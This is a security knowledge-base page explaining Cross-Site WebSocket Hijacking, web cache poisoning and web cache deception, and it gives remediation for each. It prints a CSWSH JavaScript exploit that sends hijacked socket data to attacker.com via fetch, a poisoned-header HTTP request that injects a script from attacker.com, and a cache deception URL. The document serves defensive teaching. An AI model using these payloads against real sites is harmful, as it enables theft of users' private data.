# WebSocket & Web Cache Attacks (CSWSH, Poisoning & Deception)

> Domain: Real-time Communication & HTTP Caching Exploitation
> Classification: AUTHORITATIVE KNOWLEDGE BASE
> Aligned with: RFC 6455 (WebSocket), PortSwigger Web Security Academy, OWASP Top 10

---

## 1. WebSocket Security & Cross-Site WebSocket Hijacking (CSWSH)

```text
┌─────────────────────────────────────────────────────────────────────────┐
│                        WEBSOCKET ATTACK MATRIX                          │
├───────────────────┬───────────────────┬──────────────────┬──────────────┤
│ 1. CSWSH          │ 2. Handshake Auth │ 3. Message       │ 4. Rate      │
│    (Cross-Site)   │    Bypass         │    Injection/XSS │    Flooding  │
├───────────────────┼───────────────────┼──────────────────┼──────────────┤
│ • Missing Origin  │ • Relying only on │ • Unsanitized    │ • No per-conn│
│   validation      │   cookies without │   HTML/JSON in   │   message cap│
│ • Attacker page   │   CSRF token or   │   socket.on()    │ • Resource   │
│   reads live data │   ticket token    │ • Prototype poll.│   exhaustion │
└───────────────────┴───────────────────┴──────────────────┴──────────────┘
```

### CSWSH Mechanism & Exploit:
- **Vulnerability**: WebSocket upgrade request (`GET /ws HTTP/1.1`) relies purely on standard ambient session cookies and does NOT validate the `Origin` header.
- **Exploit**: Attacker page hosts malicious JavaScript:
  ```javascript
  const ws = new WebSocket("wss://victim.com/ws");
  ws.onopen = () => ws.send(JSON.stringify({ action: "get_sensitive_chat" }));
  ws.onmessage = (e) => fetch("https://attacker.com/log", { method: "POST", body: e.data });
  ```
- **Remediation**:
  1. Strict server-side `Origin` header whitelist verification.
  2. Implement one-time ticket/nonce handshake tokens passed via `sec-websocket-protocol` or query parameter during connection establishment.

---

## 2. Web Cache Poisoning

### Mechanism:
Unkeyed inputs (e.g. `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL`, `X-Host`) are reflected in HTTP responses cached by intermediate reverse proxies (Cloudflare, Varnish, Nginx).

### Attack Matrix:
- **Unkeyed Header Injection**:
  ```http
  GET / HTTP/1.1
  Host: victim.com
  X-Forwarded-Host: attacker.com
  
  HTTP/1.1 200 OK
  X-Cache: HIT
  <script src="https://attacker.com/analytics.js"></script>
  ```
- **Fat GET / Parameter Cloaking**: Appending parameters unkeyed by cache (`/search?q=normal&utm_content=evil`).

### Defensive Remediation:
1. Strip unkeyed headers at the edge reverse-proxy before forwarding to origin.
2. Disable caching for responses carrying personalized user reflections or error codes (4xx/5xx).

---

## 3. Web Cache Deception

### Mechanism:
When the origin server handles dynamic paths as user-specific content, while the caching CDN interprets the path as a static, cacheable resource based on file extension.

### Attack Vector:
- Attacker lures victim to: `https://victim.com/account/settings.php/nonexistent.css`
- Server returns victim's private JSON/HTML profile.
- CDN caches the response because it ends with `.css`.
- Attacker fetches the exact same URL and retrieves the victim's cached profile data.

### Defensive Remediation:
1. Set `Cache-Control: no-store, private` on all authenticated endpoints.
2. Configure edge proxies to verify the response `Content-Type` before caching based purely on URL path extensions.
